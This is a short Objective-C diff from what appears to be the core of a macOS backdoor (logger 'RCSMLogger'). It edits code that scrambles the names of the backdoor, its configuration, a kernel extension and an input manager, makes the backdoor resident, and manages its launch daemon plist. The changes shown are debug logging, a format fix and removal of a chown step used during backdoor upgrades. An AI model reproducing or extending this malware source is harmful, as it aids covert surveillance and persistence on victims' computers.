@@ -740,7 +740,7 @@ static void computerWillShutdown(CFMachPortRef port,
                           shMemLog->agentID, 
                           shMemLog->status,
                           shMemLog->commandDataSize);
-                  NSLog(@"%s: header data size %d", __FUNCTION__, sizeof(shMemoryLog));
+                  NSLog(@"%s: header data size %lu", __FUNCTION__, sizeof(shMemoryLog));
 #endif
                 }
                 
@@ -1333,6 +1333,15 @@ static void computerWillShutdown(CFMachPortRef port,
   gKextName                 = [_encryption scrambleForward: gConfigurationName
                                                       seed: 4];
   
+#ifdef DEBUG_CORE
+  infoLog(@"name       : %@", gBackdoorName);
+  infoLog(@"update name: %@", gBackdoorUpdateName);
+  infoLog(@"conf name  : %@", gConfigurationName);
+  infoLog(@"conf update: %@", gConfigurationUpdateName);
+  infoLog(@"im update  : %@", gInputManagerName);
+  infoLog(@"kext name  : %@", gKextName);
+#endif
+  
   [_encryption release];
 }
 
@@ -1711,25 +1720,6 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
               errorLog(@"An error occurred while making backdoor resident");
 #endif
-            }
-          else
-            {
-              //
-              // Force owner since we can't remove that file if not owned by us
-              // with removeItemAtPath:error (e.g. backdoor upgrade)
-              //
-              NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
-                                    NSHomeDirectory(),
-                                    BACKDOOR_DAEMON_PLIST];
-              NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
-              NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
-                                         userAndGroup,
-                                         ourPlist,
-                                         nil];
-
-              [gUtil executeTask: @"/usr/sbin/chown"
-                   withArguments: _tempArguments
-                    waitUntilEnd: YES];
             }
       
           NSString *tempFileName = [[NSString alloc] initWithFormat: @"%@/%@%@",
@@ -2329,11 +2319,6 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
   BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
-
-#ifdef ENABLE_LOGGING
-  [RCSMLogger setComponent: @"core"];
-  infoLog(@"STARTING");
-#endif
 
   // Get OS version
   [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
